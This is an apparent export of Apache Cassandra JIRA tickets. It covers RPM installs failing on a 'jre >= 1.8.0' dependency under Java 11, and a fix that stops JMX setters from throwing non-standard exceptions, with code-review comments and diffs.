It seems that [the PR|https://github.com/apache/cassandra/pull/1654/commits/f34c0f47fcae1423933c7e5fa1671855735227aa] removes the original {{CompactStorageTest}} class replacing it by a new {{CompactStorageTestSplit1}} class containing roughly a half of the tests. However there isn't a {{CompactStorageTestSplit2}} class containing the other half of the tests, which are just gone. I guess that class was accidentally missed.

Also, we would need to run the new test classes in the multiplexer.;;;","31/May/22 12:39;bereng;Aixxx sometimes I amaze myself... Apologies yes I forgot to add the file to git. Added and new CI triggered. I don't think we need to multiplex it right? I mean they are not flaky at all, they don't time out at some operation, it's just a plain 'ant timeout' iiuc.;;;","31/May/22 12:55;adelapena;No worries. I think we should multiplex them. Sometimes tests can hit a JUnit timeout because they keep indefinitely stuck because of a race or some other mistake, and we don't know if that could be the case here. If this were happening, the split classes would also hit the timeout. A repeated run of the splits would clear any doubt about this.;;;","31/May/22 13:17;bereng;Ok just pushed and triggered a CI repeated run for both classes. Fingers crossed.;;;","01/Jun/22 07:23;bereng;Hi [~adelapena]100 green repeats for a total of 8.3K tests run [here|https://app.circleci.com/pipelines/github/bereng/cassandra/671/workflows/f3da43b0-acf0-4df6-9feb-04ae07919e12/jobs/5990];;;","01/Jun/22 10:49;adelapena;Great, looks good to me, +1;;;","02/Jun/22 11:50;bereng;[~adelapena] I added the trunk PR (it's identical) plus a repeat run for it. I also renamed the files from xxxTestSplitN to xxxSplitNTest to align to the convention of ending test filenames with {{Test}}. If you agree I think we can merge this.;;;","06/Jun/22 09:49;adelapena;The PR for trunk and the rename also look good to me, +1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CentOS/RHEL installation requires JRE not available in Java 11,CASSANDRA-17669,13447454,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,erickramirezau,erickramirezau,30/May/22 06:43,05/Oct/22 22:22,13/Jul/23 08:40,08/Jun/22 16:21,4.0.5,4.1-beta1,,,,,Dependencies,,,,0,,"h2. Background

A user [reported on Stack Overflow|https://stackoverflow.com/questions/72377621/] and the DataStax Developers [dtsx.io/discord|https://dtsx.io/discord] an issue with installing Cassandra when only Java 11 is installed.

h2. Symptoms

Attempts to install Cassandra using YUM requires Java 8:
{noformat}
$ sudo yum install cassandra
Dependencies resolved.
================================================================================================================================================================
 Package                                          Architecture                Version                                      Repository                      Size
================================================================================================================================================================
Installing:
 cassandra                                        noarch                      4.0.4-1                                      cassandra                       45 M
Installing dependencies:
 java-1.8.0-openjdk                               x86_64                      1:1.8.0.312.b07-2.el8_5                      appstream                      341 k
 java-1.8.0-openjdk-headless                      x86_64                      1:1.8.0.312.b07-2.el8_5                      appstream                       34 M
Installing weak dependencies:
 gtk2                                             x86_64                      2.24.32-5.el8                                appstream                      3.4 M

Transaction Summary
================================================================================================================================================================
Install  4 Packages
{noformat}
Similarly, attempts to install the RPM results in:
{noformat}
$ sudo rpm -i cassandra-4.0.4-1.noarch.rpm 
warning: cassandra-4.0.4-1.noarch.rpm: Header V4 RSA/SHA256 Signature, key ID 7e3e87cb: NOKEY
error: Failed dependencies:
	jre >= 1.8.0 is needed by cassandra-4.0.4-1.noarch{noformat}
h2. Root cause

Package installs on CentOS and RHEL platforms has [a dependency on JRE 1.8+|https://github.com/apache/cassandra/blob/trunk/redhat/cassandra.spec#L49]:
{noformat}
Requires:      jre >= 1.8.0{noformat}
However, JRE is no longer available in Java 11. From the [JDK 11 release notes|https://www.oracle.com/java/technologies/javase/11-relnote-issues.html]:
{quote}In this release, the JRE or Server JRE is no longer offered. Only the JDK is offered.
{quote}
h2. Workaround

Override the dependency check when installing the RPM with the {{--nodeps}} option:
{noformat}
$ sudo rpm --nodeps -i cassandra-4.0.4-1.noarch.rpm {noformat}",,bereng,erickramirezau,PradeepVBadiger,richardchesse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17765,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Packaging -> Package Distribution,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Sep 08 15:46:35 UTC 2022,,,,,,,Java11,,,,"0|z12seo:",9223372036854775807,,,,bereng,,,,Normal,,4.0.2,,https://github.com/apache/cassandra/commit/cd0a40d09e5c029e3cac260ecf4cb3dc02deabc7,,,,,,,,,run CI,,,,,"30/May/22 09:05;erickramirezau;I've [started a discussion on the Dev ML|https://lists.apache.org/thread/x86382mk177l25jglfqv9rrzm1sd17ks]. TL;DR should we consider dropping the dependency on the RHEL spec to bring it in-line with Debian installations?;;;","30/May/22 11:50;brandon.williams;I'll note that we should also do the inverse here - allow Debian to use Java 11.;;;","01/Jun/22 20:23;brandon.williams;Debian conventions remain the same, I only added the j11 equivalents.  For redhat it looks like 'jre-11' is provided, so I went with that and installing the package Just Worked when I had java 11 installed, but would prefer to try and install 1.8 if nothing was present already.  I think this probably works for the best.


||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17699-4.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1750/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1750/pipeline]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17699-4.1]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1748/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1748/pipeline]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17699-trunk]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1749/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1749/pipeline]|
 ;;;","07/Jun/22 08:12;bereng;Where did you see the jre-11 for rpms? I only found builds for Windows;;;","07/Jun/22 10:25;brandon.williams;That isn't a package, but what any package needs to ""provide"" to satisfy the management system.  There are a few options there depending on distro: https://rpmfind.net/linux/rpm2html/search.php?query=jre-11;;;","07/Jun/22 13:42;bereng;You're right. Did you get a chance to test and install locally? I am sorry I can't spin up VMs on my box atm to test it myself.;;;","07/Jun/22 14:19;brandon.williams;Yes, I tested it on almalinux 8.;;;","08/Jun/22 05:02;bereng;Ok LGTM +1;;;","08/Jun/22 16:21;brandon.williams;Thanks, committed.;;;","08/Sep/22 01:36;PradeepVBadiger;Hi [~brandon.williams]

I see the same issue occurring with 4.0.6 release rpm on Rocky Linux 8. It is unable to recognize java-11-openjdk installed.

{{$ sudo rpm -i cassandra-4.0.6-1-noarch.rpm}}
{{error: Failed dependencies:}}
{{        jre >= 1.8.0 is needed by cassandra-4.0.6-1.noarch}}

 

{{$ java -version}}
{{openjdk version ""11.0.16"" 2022-07-19 LTS}}
{{OpenJDK Runtime Environment (Red_Hat-11.0.16.0.8-1.el8_6) (build 11.0.16+8-LTS)}}
{{OpenJDK 64-Bit Server VM (Red_Hat-11.0.16.0.8-1.el8_6) (build 11.0.16+8-LTS, mixed mode, sharing)}}

 

Is there anything that I should check?

 

thanks,

Pradeep V.B.

 ;;;","08/Sep/22 15:34;brandon.williams;[~PradeepVBadiger] it looks like there is an issue with uploading the the packages after CASSANDRA-17765, I've created CASSANDRA-17880 to handle it.;;;","08/Sep/22 15:46;PradeepVBadiger;thanks, [~brandon.williams].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix leak of non-standard Java types in our Exceptions as clients using JMX are unable to handle them,CASSANDRA-17668,13447269,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,lmtrombone,e.dimitrova,e.dimitrova,27/May/22 18:30,22/Oct/22 11:26,13/Jul/23 08:40,26/Sep/22 15:43,5.0,,,,,,Legacy/Observability,Observability/JMX,,,0,,"This is a continuation of CASSANDRA-17638 where we fixed leaks introduced during development of 4.1 to ensure no regressions.

This ticket is to fix a few leakages which are there since previous major versions, not 4.1 regressions. 

{_}setRepairSessionMaxTreeDepth{_}(exists since 3.0) and _setRepairSessionSpaceInMegabytes(since 4.0)_

 in the DatabaseDescriptor. 

checkValidForByteConversion and _validateMaxConcurrentAutoUpgradeTasksConf (both since 4.0)_

 are used in both setters and on startup. They shouldn't throw ConfigurationException in the setters. 

There might be more but those are at least a few obvious I found in the DatabaseDescriptor.

CC [~dcapwell] ",,dcapwell,e.dimitrova,lmtrombone,,,,,,,,,,,,"ekaterinadimitrova2 commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r948142710


##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -835,13 +838,23 @@ default int upgradeSSTables(String keyspaceName, boolean excludeCurrentVersion,
 
     /** Returns the granularity of the collation index of rows within a partition **/
     public int getColumnIndexSizeInKiB();
-    /** Sets the granularity of the collation index of rows within a partition **/
+    /**
+     * @deprecated use setColumnIndexSizeInKiB instead as it will not throw non-standard exceptions
+     * Sets the granularity of the collation index of rows within a partition
+     */
     public void setColumnIndexSize(int columnIndexSizeInKB);

Review Comment:
   Same as before, let's add also @Deprecated



##########
src/java/org/apache/cassandra/service/ActiveRepairServiceMBean.java:
##########
@@ -34,9 +34,14 @@
     @Deprecated
     public int getRepairSessionSpaceInMegabytes();
 
+    /**
+     * @deprecated use setRepairSessionSpaceInMiB instead as it will not throw non-standard exceptions
+     */

Review Comment:
   We need to add @Deprecated here too, not only in Java doc and the actual implementation



##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -835,13 +838,23 @@ default int upgradeSSTables(String keyspaceName, boolean excludeCurrentVersion,
 
     /** Returns the granularity of the collation index of rows within a partition **/
     public int getColumnIndexSizeInKiB();
-    /** Sets the granularity of the collation index of rows within a partition **/
+    /**
+     * @deprecated use setColumnIndexSizeInKiB instead as it will not throw non-standard exceptions
+     * Sets the granularity of the collation index of rows within a partition
+     */
     public void setColumnIndexSize(int columnIndexSizeInKB);
+    /** Sets the granularity of the collation index of rows within a partition **/
+    public void setColumnIndexSizeInKiB(int columnIndexSizeInKiB);
 
     /** Returns the threshold for skipping the column index when caching partition info **/
     public int getColumnIndexCacheSize();
-    /** Sets the threshold for skipping the column index when caching partition info **/
+    /**
+     * @deprecated use setColumnIndexCacheSizeInKiB instead as it will not throw non-standard exceptions
+     * Sets the threshold for skipping the column index when caching partition info
+     */

Review Comment:
   @Deprecated to be added



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -4525,6 +4525,7 @@ public List<String> getParentRepairStatus(int cmd)
                ImmutableList.<String>builder().add(pair.left.name()).addAll(pair.right).build();
     }
 
+    @Deprecated

Review Comment:
   I think @Override was missed before and we can use the opportunity to add it maybe?



##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -850,8 +863,13 @@ default int upgradeSSTables(String keyspaceName, boolean excludeCurrentVersion,
 
     /** Returns the threshold for warning queries due to a large batch size */
     public int getBatchSizeWarnThreshold();
-    /** Sets the threshold for warning queries due to a large batch size */
+    /**
+     * @deprecated use setBatchSizeWarnThresholdInKiB instead as it will not throw non-standard exceptions
+     * Sets the threshold for warning queries due to a large batch size
+     */

Review Comment:
   Same @Deprecated to be added



;17/Aug/22 16:05;githubbot;600","dcapwell commented on code in PR #1817:
URL: https://github.com/apache/cassandra/pull/1817#discussion_r957607326


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -3479,16 +3479,39 @@ public void forceTerminateAllRepairSessions() {
         ActiveRepairService.instance.terminateSessions();
     }
 
+    @Deprecated

Review Comment:
   `@Deprecated` is very costly to users, so I am not in favor of asking users to migrate to a new method to fix a bug... we should just fix the bug and remove `@Deprecated`



;29/Aug/22 17:22;githubbot;600","dcapwell commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r961841628


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -6180,17 +6245,42 @@ public void setBatchSizeFailureThreshold(int threshold)
         logger.info(""updated batch_size_fail_threshold to {}"", threshold);
     }
 
+    @Deprecated
+    @Override
     public int getBatchSizeWarnThreshold()
     {
         return DatabaseDescriptor.getBatchSizeWarnThresholdInKiB();
     }
 
+    @Deprecated
+    @Override
     public void setBatchSizeWarnThreshold(int threshold)
     {
         DatabaseDescriptor.setBatchSizeWarnThresholdInKiB(threshold);
         logger.info(""Updated batch_size_warn_threshold to {}"", threshold);
     }
 
+    @Override
+    public int getBatchSizeWarnThresholdInKiB()

Review Comment:
   same comment as above, can we document ""why"" the new method that has identical logic?



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -4525,16 +4525,39 @@ public List<String> getParentRepairStatus(int cmd)
                ImmutableList.<String>builder().add(pair.left.name()).addAll(pair.right).build();
     }
 
+    @Deprecated
+    @Override
     public void setRepairSessionMaxTreeDepth(int depth)
     {
         DatabaseDescriptor.setRepairSessionMaxTreeDepth(depth);
     }
 
+    @Deprecated
+    @Override
     public int getRepairSessionMaxTreeDepth()
     {
         return DatabaseDescriptor.getRepairSessionMaxTreeDepth();
     }
 
+    @Override
+    public void setRepairSessionMaximumTreeDepth(int depth)
+    {
+        try
+        {
+            DatabaseDescriptor.setRepairSessionMaxTreeDepth(depth);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());
+        }
+    }
+
+    @Override
+    public int getRepairSessionMaximumTreeDepth()

Review Comment:
   can you add a comment explaining why this exists?  Fo someone reviewing the code its going to be asked ""why is getRepairSessionMaxTreeDepth deprecated... its the same logic here..."", so if we are going to depreciate the `get` we should explain why in the code



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -6146,29 +6169,71 @@ public void setCachedReplicaRowsFailThreshold(int threshold)
         logger.info(""updated replica_filtering_protection.cached_rows_fail_threshold to {}"", threshold);
     }
 
+    @Override
     public int getColumnIndexSizeInKiB()
     {
         return DatabaseDescriptor.getColumnIndexSizeInKiB();
     }
 
+    @Override
+    public void setColumnIndexSizeInKiB(int columnIndexSizeInKiB)
+    {
+        int oldValueInKiB = DatabaseDescriptor.getColumnIndexSizeInKiB();
+        try
+        {
+            DatabaseDescriptor.setColumnIndexSize(columnIndexSizeInKiB);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());
+        }
+        logger.info(""Updated column_index_size to {} KiB (was {} KiB)"", columnIndexSizeInKiB, oldValueInKiB);
+    }
+
+    @Deprecated
+    @Override
     public void setColumnIndexSize(int columnIndexSizeInKB)
     {
         int oldValueInKiB = DatabaseDescriptor.getColumnIndexSizeInKiB();
         DatabaseDescriptor.setColumnIndexSize(columnIndexSizeInKB);
         logger.info(""Updated column_index_size to {} KiB (was {} KiB)"", columnIndexSizeInKB, oldValueInKiB);
     }
 
+    @Deprecated
+    @Override
     public int getColumnIndexCacheSize()
     {
         return DatabaseDescriptor.getColumnIndexCacheSizeInKiB();
     }
 
+    @Deprecated
+    @Override
     public void setColumnIndexCacheSize(int cacheSizeInKB)
     {
         DatabaseDescriptor.setColumnIndexCacheSize(cacheSizeInKB);
         logger.info(""Updated column_index_cache_size to {}"", cacheSizeInKB);
     }
 
+    @Override

Review Comment:
   same comment as above, can we document ""why"" the new method that has identical logic?



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -6146,29 +6169,71 @@ public void setCachedReplicaRowsFailThreshold(int threshold)
         logger.info(""updated replica_filtering_protection.cached_rows_fail_threshold to {}"", threshold);
     }
 
+    @Override

Review Comment:
   same comment as above, can we document ""why"" the new method that has identical logic?



;02/Sep/22 16:25;githubbot;600","ekaterinadimitrova2 commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r961850841


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -4525,16 +4525,39 @@ public List<String> getParentRepairStatus(int cmd)
                ImmutableList.<String>builder().add(pair.left.name()).addAll(pair.right).build();
     }
 
+    @Deprecated
+    @Override
     public void setRepairSessionMaxTreeDepth(int depth)
     {
         DatabaseDescriptor.setRepairSessionMaxTreeDepth(depth);
     }
 
+    @Deprecated
+    @Override
     public int getRepairSessionMaxTreeDepth()
     {
         return DatabaseDescriptor.getRepairSessionMaxTreeDepth();
     }
 
+    @Override
+    public void setRepairSessionMaximumTreeDepth(int depth)
+    {
+        try
+        {
+            DatabaseDescriptor.setRepairSessionMaxTreeDepth(depth);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());
+        }
+    }
+
+    @Override
+    public int getRepairSessionMaximumTreeDepth()

Review Comment:
   Good point, we can also add the ticket number for clarity



;02/Sep/22 16:38;githubbot;600","lmtrombone commented on PR #1825:
URL: https://github.com/apache/cassandra/pull/1825#issuecomment-1236017234

   Closing as it as been decided that we will be making changes only to trunk.


;03/Sep/22 01:18;githubbot;600","lmtrombone closed pull request #1825: CASSANDRA-17668 handle leak of non-standard Java types as clients using JMX cannot handle them
URL: https://github.com/apache/cassandra/pull/1825


;03/Sep/22 01:18;githubbot;600","lmtrombone commented on PR #1819:
URL: https://github.com/apache/cassandra/pull/1819#issuecomment-1236017436

   Closing as it as been decided that we will be making changes only to trunk.


;03/Sep/22 01:19;githubbot;600","lmtrombone closed pull request #1819: CASSANDRA-17668 handle leak of non-standard Java types as clients using JMX cannot handle them
URL: https://github.com/apache/cassandra/pull/1819


;03/Sep/22 01:19;githubbot;600","lmtrombone closed pull request #1818: CASSANDRA-17668 handle leak of non-standard Java types as clients using JMX cannot handle them
URL: https://github.com/apache/cassandra/pull/1818


;03/Sep/22 01:19;githubbot;600","lmtrombone commented on PR #1818:
URL: https://github.com/apache/cassandra/pull/1818#issuecomment-1236017513

   Closing as it as been decided that we will be making changes only to trunk.


;03/Sep/22 01:19;githubbot;600","lmtrombone commented on PR #1817:
URL: https://github.com/apache/cassandra/pull/1817#issuecomment-1236017565

   Closing as it as been decided that we will be making changes only to trunk.


;03/Sep/22 01:19;githubbot;600","lmtrombone closed pull request #1817: CASSANDRA-17668 handle leak of non-standard Java types as clients using JMX cannot handle them
URL: https://github.com/apache/cassandra/pull/1817


;03/Sep/22 01:19;githubbot;600","lmtrombone commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r962082278


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -6146,29 +6169,71 @@ public void setCachedReplicaRowsFailThreshold(int threshold)
         logger.info(""updated replica_filtering_protection.cached_rows_fail_threshold to {}"", threshold);
     }
 
+    @Override

Review Comment:
   this is actually an existing method that I added `@Override` to for consistency purposes / best practices.  If you still think it makes sense to add a comment here, let me know.



;03/Sep/22 01:27;githubbot;600","ekiauhce commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r962298356


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -297,18 +298,44 @@ public int getRepairSessionSpaceInMegabytes()
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Deprecated
     @Override
     public void setRepairSessionSpaceInMebibytes(int sizeInMebibytes)
     {
         DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
     }
 
+    @Deprecated
     @Override
     public int getRepairSessionSpaceInMebibytes()
     {
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Override
+    public void setRepairSessionSpaceInMiB(int sizeInMebibytes)
+    {
+        try
+        {
+            DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());

Review Comment:
   It's better to use `IllegalArgumentException(Throwable cause)` constructor, because it will preserve `e` stacktrace.



;04/Sep/22 11:36;githubbot;600","ekaterinadimitrova2 commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r964276209


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -297,18 +298,44 @@ public int getRepairSessionSpaceInMegabytes()
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Deprecated
     @Override
     public void setRepairSessionSpaceInMebibytes(int sizeInMebibytes)
     {
         DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
     }
 
+    @Deprecated
     @Override
     public int getRepairSessionSpaceInMebibytes()
     {
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Override
+    public void setRepairSessionSpaceInMiB(int sizeInMebibytes)
+    {
+        try
+        {
+            DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());

Review Comment:
   This would be a precedent, I can't imagine putting the Stacktrace as an error message in JConsole, @dcapwell ?



;07/Sep/22 00:23;githubbot;600","ekaterinadimitrova2 commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r964276209


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -297,18 +298,44 @@ public int getRepairSessionSpaceInMegabytes()
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Deprecated
     @Override
     public void setRepairSessionSpaceInMebibytes(int sizeInMebibytes)
     {
         DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
     }
 
+    @Deprecated
     @Override
     public int getRepairSessionSpaceInMebibytes()
     {
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Override
+    public void setRepairSessionSpaceInMiB(int sizeInMebibytes)
+    {
+        try
+        {
+            DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());

Review Comment:
   This would be a precedent here I think, I can't imagine putting the Stacktrace as an error message in JConsole, @dcapwell ?



;07/Sep/22 00:24;githubbot;600","lmtrombone commented on code in PR #1788:
URL: https://github.com/apache/cassandra/pull/1788#discussion_r964289053


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -297,18 +298,44 @@ public int getRepairSessionSpaceInMegabytes()
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Deprecated
     @Override
     public void setRepairSessionSpaceInMebibytes(int sizeInMebibytes)
     {
         DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
     }
 
+    @Deprecated
     @Override
     public int getRepairSessionSpaceInMebibytes()
     {
         return DatabaseDescriptor.getRepairSessionSpaceInMiB();
     }
 
+    @Override
+    public void setRepairSessionSpaceInMiB(int sizeInMebibytes)
+    {
+        try
+        {
+            DatabaseDescriptor.setRepairSessionSpaceInMiB(sizeInMebibytes);
+        }
+        catch (ConfigurationException e)
+        {
+            throw new IllegalArgumentException(e.getMessage());

Review Comment:
   Unless I'm missing something, I don't think this will be applicable here.  I tried it and JConsole did not respond well to it and had trouble properly displaying the stacktrace as is.  



;07/Sep/22 00:58;githubbot;600","smiklosovic closed pull request #1788: CASSANDRA-17668 handle leak of non-standard Java types as clients using JMX cannot handle them
URL: https://github.com/apache/cassandra/pull/1788


;22/Oct/22 11:26;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,10800,,,0,10800,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17638,,,,,,,,,,,,,,,"14/Sep/22 06:30;lmtrombone;Screen Shot 2022-09-13 at 11.27.30 PM.png;https://issues.apache.org/jira/secure/attachment/13049269/Screen+Shot+2022-09-13+at+11.27.30+PM.png",,,,,1.0,lmtrombone,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 26 15:42:46 UTC 2022,,,,,,,All,,,,"0|z12r9k:",9223372036854775807,,,,dcapwell,e.dimitrova,,,Normal,,,,https://github.com/apache/cassandra/commit/e5c9cf4cbe6634ba9e148b6e27b6bad98648e597,,,,,,,,,Test using JConsole and added new unit tests,,,,,"14/Aug/22 22:32;lmtrombone;I believe I have a fix for this now -  [https://github.com/apache/cassandra/pull/1788] . 

Some notes/observations:
 * '{_}validateMaxConcurrentAutoUpgradeTasksConf{_} ' has been left alone as we have some try catch logic for one of the functions that calls this and 'ConfigurationExceptions' will get converted to 'IllegalArgumentException'
 * 'checkValidForByteConversion' seems to be used in tandem with the constructor 'DataStorageSpec.IntKibibytesBound' for the jmx setters
 ** 'StorageService.setColumnIndexSize' (added in 4.1)
 ** 'StorageService.setColumnIndexCacheSize' (added in 4.0)
 ** 'StorageService.setBatchSizeWarnThreshold' (added in 4.0)

There were some recent changes to this constructor ( https://issues.apache.org/jira/browse/CASSANDRA-17571 ) in 4.1 that will cause the aforementioned jmx setters to throw 'IllegalArgumentException' when certain values are encountered.  I was tempted to just modify 'checkValidForByteConversion' so it throws 'IllegalArgumentException' as this will make my solution much simpler/cleaner and because it already throws it elsewhere.  However, for now I have opted to create new methods as from my understanding, modifying the exceptions thrown is still a breaking change to two of the APIs that have been released in 4.0.;;;","17/Aug/22 16:08;e.dimitrova;Hi [~lmtrombone],

Thank you for the patch and the extensive explanation!

Overall it looks good on a quick skim, I left some tiny suggestions. Just to confirm, did you have the chance to verify whether there are other setters/getters in the DatabaseDescriptor that can suffer from this problem, out of the list/examples suggested on the ticket? 
Also, I would like to suggest to add some basic unit tests to DatabaseDescriptorTest class? 
Also, I think we need patches for previous versions and we normally merge them from lower affected version upwards to trunk - for more info https://cassandra.apache.org/_/development/patches.html (Bug Fixes section). There might be also the case we need different patches for the different versions as things diverged between them. I can run a full CI for you when we get things into shape.
One more thing is to check whether our docs need some relevant update, at minimum we need to update the Deprecation section in NEWS.txt. Thank you for your work!
{quote} I was tempted to just modify 'checkValidForByteConversion' so it throws 'IllegalArgumentException' as this will make my solution much simpler/cleaner and because it already throws it elsewhere.  However, for now I have opted to create new methods as from my understanding, modifying the exceptions thrown is still a breaking change to two of the APIs that have been released in 4.0. 
{quote}
The breaking change is one very valid point. Another one is that checkValidForByteConversion is also used on startup. We throw ConfigurationException on startup, JMX setters/getters should throw IllegalArgumentException though

[~dcapwell] , do you mind to be a second reviewer for this ticket as you were the one who initially raised the point and worked on fixing breaking changes?;;;","18/Aug/22 06:59;lmtrombone;[~e.dimitrova] Thanks for your feedback! I have a few follow-up comments/questions:

{quote}
Just to confirm, did you have the chance to verify whether there are other setters/getters in the DatabaseDescriptor that can suffer from this problem, out of the list/examples suggested on the ticket? 
{quote}
I did try to look for other other getter/setters that could have this problem when I initially worked on the ticket, but wasn't able to find others.  I'll give it another go tomorrow, now that I'm a bit more familiar with this part of the code.  Is this the only place that has this problem and if not, do you want me to try to see if I can find other places too?

{quote}
Also, I would like to suggest to add some basic unit tests to DatabaseDescriptorTest class? 
{quote}
In my pull request, I didn't touch the DatabaseDescriptor class at all and looking at the that file, I think any unit tests I add there might be out of place.  I think StorageServiceTest and ActiveRepairServiceTest seem like a better place for them?

A recent thought is that with my changes, we now have different names for setters vs getters e.g. 'RepairSessionMaxTreeDepth' for getting vs 'RepairSessionMaximumTreeDepth' for setting.  Is this something that will still be acceptable?;;;","18/Aug/22 13:20;e.dimitrova;{quote}Is this the only place that has this problem and if not, do you want me to try to see if I can find other places too?
{quote}
I would say this will be enough for the scope of this ticket but if you are curious to play around more with the code, I wouldn't discourage you. I will leave it to you to decide how much time you want to invest in this task. We can also spin follow up tickets. 
{quote}In my pull request, I didn't touch the DatabaseDescriptor class at all and looking at the that file, I think any unit tests I add there might be out of place. I think StorageServiceTest and ActiveRepairServiceTest seem like a better place for them?
{quote}
Correct, I wanted to say similar to what some of the tests in the DatabaseDescriptorTest but I messed up.
{quote}A recent thought is that with my changes, we now have different names for setters vs getters e.g. 'RepairSessionMaxTreeDepth' for getting vs 'RepairSessionMaximumTreeDepth' for setting. Is this something that will still be acceptable?
{quote}
Another good point. Yes, for consistency the practice is to deprecate the old pair getter/setter and create both new ones. Thanks

 ;;;","26/Aug/22 06:21;lmtrombone;I checked all the other methods in DatabaseDescriptor and their usages and I didn't find any others. I have updated the original pull request ( [https://github.com/apache/cassandra/pull/1788] ) and incorporated the feedback given.

Here are the pull requests for the other versions:
3.0 - [https://github.com/apache/cassandra/pull/1817]

3.11 - [https://github.com/apache/cassandra/pull/1818]

4.0 - [https://github.com/apache/cassandra/pull/1819]

4.1 - [https://github.com/apache/cassandra/pull/1825]

[~e.dimitrova] Could you give the pull requests a look when you get the chance?;;;","29/Aug/22 16:18;e.dimitrova;Thanks [~lmtrombone] ! I just wanted to push your branches to CI but I noticed they are not rebased since quite some time. Also, the 4.1 patch is not propagated to trunk.

